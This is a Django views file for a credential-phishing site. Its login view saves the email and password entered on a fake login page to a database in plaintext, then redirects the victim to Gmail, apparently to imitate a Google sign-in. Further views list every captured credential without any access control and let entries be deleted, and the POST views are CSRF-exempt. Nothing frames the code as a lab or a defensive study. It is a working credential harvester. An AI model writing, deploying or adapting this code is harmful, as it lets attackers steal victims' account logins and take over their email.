from django.shortcuts import render, redirect
from .models import CapturedPassword
from django.views.decorators.csrf import csrf_exempt

from django.views.decorators.csrf import csrf_exempt
from django.shortcuts import render, redirect
from .models import CapturedPassword
from django.views.decorators.csrf import csrf_exempt
from django.shortcuts import get_object_or_404

@csrf_exempt
def login_view(request):
    print("🔥 login_view called")

    if request.method == 'POST':


        email = request.POST.get('email')
        password = request.POST.get('password')


        if email and password:
            print("💾 Saving credentials to database...")
            CapturedPassword.objects.create(email=email, password=password)

   
            return redirect('https://mail.google.com')

        else:
            print("⚠️ Email or password missing in POST data")

    else:
        print("📭 GET request received, rendering login form")

    return render(request, 'login.html')

def password_list(request):
    print("📃 password_list view called")
    passwords = CapturedPassword.objects.all().order_by('-created_at')
    print(f"📊 Total captured entries: {passwords.count()}")
    return render(request, 'password_list.html', {'passwords': passwords})



@csrf_exempt
def delete_password(request, id):
    if request.method == 'POST':
        print(f"🗑️ Attempting to delete password entry ID: {id}")
        entry = get_object_or_404(CapturedPassword, id=id)
        entry.delete()
        print("✅ Deleted successfully")
    return redirect('password_list')
